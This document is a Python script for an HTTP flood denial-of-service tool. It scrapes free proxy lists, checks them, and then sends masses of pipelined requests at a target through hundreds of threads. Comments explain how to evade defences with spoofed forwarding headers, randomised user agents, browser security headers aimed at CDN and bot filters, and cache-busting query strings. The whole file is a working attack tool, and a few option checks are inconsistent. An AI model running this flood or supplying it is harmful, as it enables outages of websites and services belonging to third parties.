import os
import ssl
import sys
import time
import socks
import socket
import random
import requests
import threading
from queue import Queue


attemps = 0
os.system("clear")
print("""
\033[31m┌─┐     ╭──────╮╭─╮   ╭─╮╭──────╮
\033[31m│ │     │ ╭──╮ ││ │   │ ││ ╭────╯       
\033[31m│ │     │ │  │ ││ │   │ ││ │            
\033[31m│ │     │ │  │ ││ │   │ ││ ╰────╮\033[37m╭────╮╭╮
\033[31m│ │     │ │  │ ││ │   │ ││ ╭────╯\033[37m│╭───╯││
\033[31m│ │     │ │  │ │╰╮╰╮ ╭╯╭╯│ │     \033[37m││╭─╯╰───╮
\033[31m└──────┐│ ╰──╯ │ ╰╮╰─╯╭╯ │ ╰────╮\033[37m││╰─╮╭───╯
\033[31m  └─────┘╰─────╯  ╰───╯  ╰──────╯\033[37m│╰───╮││     
                                 \033[37m╰───╮│││
                                 \033[37m╭───╯││╰───╮
                                 \033[37m╰───╯╰───╯
""")
while attemps < 100:                             
    username = input("\033[33mEnter your username: \033[30m")
    password = input("\033[33mEnter your password: \033[30m")

    if username == 'love' and password == 'story':
        print("\033[38;5;206mM00ving\033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

# -----------------------------------

rand = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
string = ['Hurricane','Proknight','Sockskull','Taixies','Collapser','Deprave','JeiKai','Noro','Ebola']
rInt = random.randint
rC = random.choice
lock = threading.Lock()
q = Queue()
th_list = []
thread_pool = []
download_proxy = []
worked_proxy = []
good_proxies = []
socket_list = []
conns = 0
brute = False
cdn = False
pps = False
# ua_list = open('useragent.txt').readlines() # 測試用的 用網路上的列表即可, 不然這種網上的列表 基本都會被WAF規則擋下來
proxy_file = "proxies.txt"
output_file = "dpf.txt"

# ------------------------------------------

def GenUA():
    AW = f"{rInt(500,599)}.36"
    BV = f"{rInt(24,80)}.0.{rInt(3000,4000)}.{rInt(1,200)}"
    OPR = f"{rInt(30,70)}.0.{rInt(1000,4000)}.{rInt(1,1000)}"
    UCB = f"{rInt(5,12)}.{rInt(5,12)}.{rInt(0,10)}.{rInt(1,1000)}"
    devices = rC(["IOS","Windows","X11","Android","Symbian","Macintosh"])
    if devices =="Windows":
        version = rC(
            [
                "Windows NT 10.0; Win64; X64",
                "Windows NT 10.0; WOW64",
                "Windows NT 5.1; rv:7.0.1",
                "Windows NT 6.1; WOW64; rv:54.0",
                "Windows NT 6.3; Win64; x64",
                "Windows NT 6.3; WOW64; rv:13.37"
                ])
    elif devices =="IOS":
        version = rC(
            [
                "iPhone; CPU iPhone OS 13_3 like Mac OS X",
                "iPad; CPU OS 13_3 like Mac OS X",
                "iPod touch; iPhone OS 4.3.3",
                "iPod touch; CPU iPhone OS 12_0 like Mac OS X"
            ])
    elif devices =="X11":
        version = rC(
            [
                "X11; Linux x86_64",
                "X11; Ubuntu; Linux i686",
                "SMART-TV; Linux; Tizen 2.4.0",
                "X11; Ubuntu; Linux x86_64",
                "X11; U; Linux amd64",
                "X11; GNU/LINUX",
                "X11; CrOS x86_64 11337.33.7",
                "X11; Debian; Linux x86_64"
            ])
    elif devices =="Android":
        version = rC(
            [
                "Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
                "Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
                "Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
                "Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
                "Linux; Android 5.1.1; vivo X7 Build/LMY47V",
                "Linux; Android 6.0; Nexus 5 Build/MRA58N",
                "Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
                "Linux; Android 8.0.0; SM-N9500 Build/R16NW",
                "Linux; Android 9.0; SAMSUNG SM-G950U"
            ])
    elif devices =="Macintosh":
        version = rC(
            [
                "Macintosh; Intel Mac OS X 10_14_4",
                "Macintosh; U; Intel Mac OS X 12_10_0"
            ])
    elif devices =="Symbian":
        version = rC(
            [
                "Series40; Nokia200/11.56; Profile/MITP-2.1 Configuration/CLDC-1.1",
                "SymbianOS/9.1; U; en-us",
                "Series30Plus; Nokia220/10.03.11; Profile/Series30Plus Configuration/Series30Plus"
            ])
    borwser = rC(["chrome","uc","op"])
    if borwser =="chrome":
        return f"User-Agent: Mozilla/5.0 ({version}) AppleWebKit/{AW} (KHTML, like Gecko) Chrome/{BV} Safari/{AW}"
    elif borwser =="op":
        return f"User-Agent: Mozilla/5.0 ({version}) AppleWebKit/{AW} (KHTML, like Gecko) Chrome/{BV} Safari/{AW} OPR/{OPR}"
    elif borwser =="uc":
        return f"User-Agent: Mozilla/5.0 ({version}) AppleWebKit/{AW} (KHTML, like Gecko) Version/4.0 Chrome/{BV} UCBrowser/{UCB} Safari/{AW}"


def is_valid_proxy_format(proxy): #Check if the proxy format is correct
    try:
        proxy_ip, proxy_port = proxy.strip().split(":")
        int(proxy_port)
        return True
    except:
        return False


def check_proxy(proxy): # Detecting proxy TCP connections and HTTP requests
    global conns
    proxy_ip, proxy_port = proxy.strip().split(":")
    proxy_port = int(proxy_port)

    s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
    s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
    s.settimeout(2)

    try:
        s.connect((host, port))
        if port == 443:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            s = context.wrap_socket(s, server_hostname=host)
        s.send(f"HEAD / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())

        with lock:
            conns += 1
            good_proxies.append(proxy)
            print(f"\033[38;5;206mL0veStory\033[37m=>proxy: \033[35m{proxy_ip:^15s}\033[0m port: \033[33;1m{str(proxy_port):^5s}\033[0m conns: \033[34m{str(conns):^4s}\033[0m >{proto:^5s} \033[32mConnected\033[0m")
            print(f'\33]0;[{conns}] Proxies | ProxyChecker Code By GogoZin\a',end='')
    except Exception as e:
        pass
        # print(f"[-] FAIL: {proxy} ({e})")
    finally:
        s.close()

def Proxy_worker(): #Clever Trick: Adding This Step Speeds Up Detection
    while not q.empty():
        proxy = q.get()
        check_proxy(proxy)
        q.task_done()

def load_proxies(): #Load proxy list
    with open(proxy_file) as f:
        raw = [line.strip() for line in f if line.strip()]
    return [p for p in raw if is_valid_proxy_format(p)]

def launchChecker(): #Starting proxy check
    proxies = load_proxies()
    for proxy in proxies:
        q.put(proxy)

    threads = []
    for _ in range(min(300, len(proxies))):
        t = threading.Thread(target=Proxy_worker)
        t.daemon = True
        t.start()
        threads.append(t)

    q.join()

    #Proxy saved successfully
    with open(output_file, "w") as f:
        for proxy in sorted(set(good_proxies)):
            f.write(proxy + "\n")

    print(f"\n✅ Check complete! Success.: {len(good_proxies)}, Fail: {len(proxies) - len(good_proxies)}")
    time.sleep(3)


def GetReferer():
    referers = [ # Some common search engine referrers; nowadays, few mechanisms target referrers, so they are optional.
        f'https://www.google.com/search?q={host}',
        f'https://www.bing.com/search?q={host}',
        f'https://tw.search.yahoo.com/search?p={host}',
        f'https://duckduckgo.com/?t=h_&q={host}'
    ]

    return random.choice(referers)


def fakeIP(): #FakeIP — specifically targeting those moronic backend engineers.
    ip = ""
    for _ in range(4):
        ip += f".{random.randint(1,254)}"
        # Make no mistake: there really are moronic backend developers who think the IP address seen in the admin panel is the actual one. 
        # Here’s a quick reality check: any IP address retrieved by the database—regardless of which header it comes from—can be completely faked.
        # IP addresses in headers like X-Forwarded-For, Client-IP, Via, etc., can all be spoofed. 
        # Remember: any data sent to the backend can be forged! 
        # Only the IP address associated with the TCP connection represents the true source of the traffic (in the case of a CC attack, it would be the proxy's IP; for a botnet, it would be the bot's IP).
    return ip[1:] # 123.123.123.123


def headerHandle(): #Packet Header Processing

    # Standard HTTP headers, including common ones like 'Connection' and 'Accept'.
    # If the website is not hosted on a cloud node, these headers can be used to cripple it.
    conn = f"Connection: Keep-Alive\r\n"
    accept = f"Accept: */*\r\nAccept-Encoding: gzip, deflate, br, zstd\r\nAccept-Language: zh-TW,zh;q=0.5\r\n"
    referer = f"Referer: {GetReferer()}\r\n"
    useragent = f"{GenUA()}\r\n"
    x_for = f"X-Forwarded-For: {fakeIP()}\r\nX-Forwarded-Host: {host}\r\nX-Real-IP: {fakeIP()}\r\n"
    fake = f"Client-IP: {fakeIP()}\r\nVia: 1.1 {host}\r\nForwarded: for={fakeIP()}; proto={proto}; host={host}\r\n"
    cache = f"Cache-Control: no-cache, max-age=0\r\n"
    pri = f"Priority: u=1, i\r\n"
    origin = f"Origin: "
    if port == 443:
        origin += f"https://{host}\r\n"
    else:
        origin += f"http://{host}\r\n"
    uir = f"Upgrade-Insecure-Requests: 1\r\n"

    # HTTP security headers are supported by most mainstream browsers and serve as one of the criteria for distinguishing legitimate traffic from bot traffic. 
    # Most new sites have security features enabled by default; consequently, traffic lacking these headers is often flagged as malicious.
    sec = f"Sec-Ch-Ua: \"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"\r\n"
    sec += f"Sec-Ch-Ua-arch: \"x86\"\r\n"
    sec += f"Sec-Ch-Ua-bitness: \"64\"\r\n"
    sec += f"Sec-Ch-Ua-full-version-list: \"Chromium\";v=\"136.0.0.0\", \"Brave\";v=\"136.0.0.0\", \"Not.A/Brand\";v=\"99.0.0.0\"\r\n"
    sec += f"Sec-Ch-Ua-mobile: ?0\r\n"
    sec += f"Sec-Ch-Ua-model: \"\"\r\n"
    sec += f"Sec-Ch-Ua-platform: \"Windows\"\r\n"
    sec += f"Sec-Ch-Ua-platform-version: \"19.0.0\"\r\n"
    sec += f"Sec-Ch-Ua-wow64: ?0\r\n"
    sec += f"Sec-Fetch-Dest: document\r\n"
    sec += f"Sec-Fetch-Mode: navigate\r\n"
    sec += f"Sec-Fetch-Site: same-origin\r\n"
    sec += f"Sec-Fetch-User: ?1\r\n"
    sec += f"Sec-Gpc: 1\r\n"

    header = conn + accept + referer + useragent + x_for + fake + cache + pri + origin + uir
    if brute: # If brute-force mode is enabled, minimize headers to include only the essential ones.
        header = conn + accept + referer + useragent + uir
    if cdn == 'bypass': #If it's bypass mode, then sec must be added.
        header +=sec
    return header #Return the processed header


def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done this countless times, I can say with certainty that out of a list of 50,000 to 70,000 proxies with latencies under one second, no more than 400 are actually usable.
    global download_proxy
    print("Auto Proxy Scraper")
    time.sleep(2)
    s5URL = [
             "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all",
             "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
             "https://www.proxy-list.download/api/v1/get?type=http"
             ]
    
    print("Start Fetch http Proxies")
    for u in s5URL:
        r = requests.get(u)
        if r.status_code == 200:
            print(f"[L0veStort]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
            lst = r.text.split("\r\n")
            for lines in lst:
                if len(lines) > 10 and len(lines) < 22:
                    download_proxy.append(lines)
    
    print("Start fetch from geonode ")
    geo = ["https://proxylist.geonode.com/api/proxy-list?protocols=http&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
           "https://proxylist.geonode.com/api/proxy-list?protocols=http&limit=500&page=2&sort_by=lastChecked&sort_type=desc",
           "https://proxylist.geonode.com/api/proxy-list?protocols=http&limit=500&page=3&sort_by=lastChecked&sort_type=desc"]
    for u in geo:
        r = requests.get(u)
        if r.status_code == 200:
            lst = r.text.split("}")
            # print(lst)
            for lines in lst:
                # print(lines)
                if "ip" and "port" in lines:
                    ip = lines.split("ip\":\"")[1].split("\",\"")[0]
                    port = lines.split("port\":\"")[1].split("\",\"")[0]
                    proxy = ip+":"+port
                download_proxy.append(proxy)
            
        print(f"[L0veStory]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")

    print("Start Fetch From FreeProxyUpdate")
    fpu = ["https://freeproxyupdate.com/files/txt/http.txt",
          "https://freeproxyupdate.com/files/txt/https-ssl.txt",
          "https://freeproxyupdate.com/files/txt/elite.txt",
          "https://freeproxyupdate.com/files/txt/anonymous.txt",
          "https://freeproxyupdate.com/files/txt/transparent.txt",
          "https://freeproxyupdate.com/files/txt/argentina.txt",
          "https://freeproxyupdate.com/files/txt/australia.txt",
          "https://freeproxyupdate.com/files/txt/bangladesh.txt",
          "https://freeproxyupdate.com/files/txt/brazil.txt",
          "https://freeproxyupdate.com/files/txt/canada.txt",
          "https://freeproxyupdate.com/files/txt/china.txt",
          "https://freeproxyupdate.com/files/txt/colombia.txt",
          "https://freeproxyupdate.com/files/txt/dominican-republic.txt",
          "https://freeproxyupdate.com/files/txt/ecuador.txt",
          "https://freeproxyupdate.com/files/txt/egypt.txt",
          "https://freeproxyupdate.com/files/txt/france.txt",
          "https://freeproxyupdate.com/files/txt/germany.txt",
          "https://freeproxyupdate.com/files/txt/india.txt",
          "https://freeproxyupdate.com/files/txt/indonesia.txt",
          "https://freeproxyupdate.com/files/txt/japan.txt",
          "https://freeproxyupdate.com/files/txt/russia.txt",
          "https://freeproxyupdate.com/files/txt/singapore.txt",
          "https://freeproxyupdate.com/files/txt/south-korea.txt",
          "https://freeproxyupdate.com/files/txt/spain.txt",
          "https://freeproxyupdate.com/files/txt/thailand.txt",
          "https://freeproxyupdate.com/files/txt/united-kingdom.txt",
          "https://freeproxyupdate.com/files/txt/united-states.txt",
          "https://freeproxyupdate.com/files/txt/vietnam.txt"]
    for u in fpu:
        r = requests.get(u)
        if r.status_code == 200:
            print(f"[L0veStory]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
            lst = r.text.split('\n')
            for lines in lst:
                if len(lines) > 10 and len(lines) < 22:
                    download_proxy.append(lines)        
    
    git_proxy_list = [                 #Github proxies is suck, so don't use it
            "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies_anonymous/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/refs/heads/main/proxies/http.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/http.txt",
            "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/https.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/refs/heads/master/https.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/refs/heads/master/http.txt",
            "https://raw.githubusercontent.com/zevtyardt/proxy-list/refs/heads/main/socks5.txt",
            "https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/refs/heads/main/http.txt",
            "https://raw.githubusercontent.com/sunny9577/proxy-scraper/refs/heads/master/generated/http_proxies.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/refs/heads/main/HTTPS_RAW.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/refs/heads/master/http.txt",
            "https://raw.githubusercontent.com/r00tee/Proxy-List/refs/heads/main/Https.txt"
    ]

    proxifly = "https://raw.githubusercontent.com/proxifly/free-proxy-list/refs/heads/main/proxies/protocols/http/data.txt"

    print("fetch proxies from Proxifly")
    r = requests.get(proxifly)
    if r.status_code == 200:
        print(f"\033[38;5;206mL0veStory\033[37m=>status: \033[32m{r.status_code}\033[0m \033[36mProxifly\033[0m")
        lst = r.text.split('\n')
        for lines in lst:
            if len(lines) > 10 and len(lines) < 22:
                download_proxy.append(lines)
                
    ip89cn = "https://api.89ip.cn/tqdl.html?api=1&num=9999&port=&address=&isp="
    r = requests.get(ip89cn)
    if r.status_code == 200:
        print(f"\033[38;5;220mL0veStory\033[37m=>status: \033[32m{r.status_code}\033[0m \033[36m89ip.cn\033[0m")
        lst = r.text.split('\n')
        for lines in lst:
            if len(lines) > 10 and len(lines) < 22:
                download_proxy.append(lines)

    print("Start Get Github Proxies")
    for u in git_proxy_list:
        host = u.split(".com/")[1]
        r = requests.get(u)
        if r.status_code == 200:
            print(f"[L0veStory]->status: \033[32;1m{r.status_code}\033[0m \033[36m{host}\033[0m")
            lst = r.text.split("\n")
            for lines in lst:
                if len(lines) > 10 and len(lines) < 22:
                    download_proxy.append(lines)

    # uni_ip = set()
    # result = []
    # for item in download_proxy:
    #     p_ip = item.split(":")[0]
    #     if p_ip not in uni_ip:
    #         uni_ip.add(p_ip)
    #         result.append(item)

    download_proxy = sorted(set(download_proxy))


def launchThreads():
    for _ in range(thr):
        try:
            t = threading.Thread(target=send_requests)
            t.start()
        except:
            pass


def send_requests(): #TraditionHTTP FLOOD
    try:
        proxy_ip, proxy_port = random.choice(good_proxies).split(":")
        proxy_port = int(proxy_port)
    except ValueError:
        return
    if pps:
        header = "Connection: Keep-Alive\r\n"
    else:
        header = headerHandle()
    header += f'\r\n'
    while 1:
        try:
            s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Re-enable port (non-shared)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096 * 4096) # Increase the transmission buffer; use this if the device bandwidth is low.1024 * 1024
            s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
            s.connect((host, port))
            if port == 443:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) # Use standard TLS
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=host)
            try:
                for _ in range(400):
                    s.send(f"{method} {path}?{rC(string)}={rInt(1,99999)}{rC(rand)} HTTP/1.1\r\nHost: {host}\r\n{header}".encode())
                print(f"[L0veStory]->Stress \033[36m{host}\033[0m From: \033[35;1m{proxy_ip}:{proxy_port}\033[0m")
            except:
                print(f"[L0veStory]->Proxy: \033[35;1m{proxy_ip}:{proxy_port}\033[0m request \033[31;1mFailed\033[0m")
                s.close()
                proxy_ip, proxy_port = random.choice(good_proxies).split(":")
                proxy_port = int(proxy_port)
        except:
            s.close()
            proxy_ip, proxy_port = random.choice(good_proxies).split(":")
            proxy_port = int(proxy_port)


if __name__ == '__main__':
    if len(sys.argv) < 6:
        print("Usage : goo.py <GET/POST/HEAD> <host> <port> <threads> <path> ")
        print(" --fetch  | For fetch proxies auto")
        print(" --pps    | Flood with no header")
        print(" --brute  | Flood with less header")
        print(" --cdn    | Flood with sec header")
        sys.exit()
    else:
        try:
            if '--pps' in sys.argv:
                pps = True
            if '--brute' in sys.argv:
                brute = True
            if '--cdn' in sys.argv:
                cdn = True
            p_Type = socks.HTTP
            method = str(sys.argv[1]).upper()
            host = str(sys.argv[2])
            port = int(sys.argv[3])
            if port == 443:
                proto = "HTTPS"
            else:
                proto = "HTTP"
            thr = int(sys.argv[4])
            if thr > 800:
                thr = 800
            else:
                thr = thr
            sema = threading.Semaphore(thr)
            path = str(sys.argv[5])
            version = str(sys.argv[6])
        except Exception as e:
            print(f"Argv Error : {e}")
            sys.exit()
        f = open('proxies.txt','w')
        if "--fetch" in sys.argv:
            ProxyScraper()
        else:
            download_proxy = open(str(input("Enter Your Proxy List File Name : "))).readlines()
        for l in download_proxy:
            f.write(f"{l}\n")
        f.close()
        launchChecker()
        launchThreads()
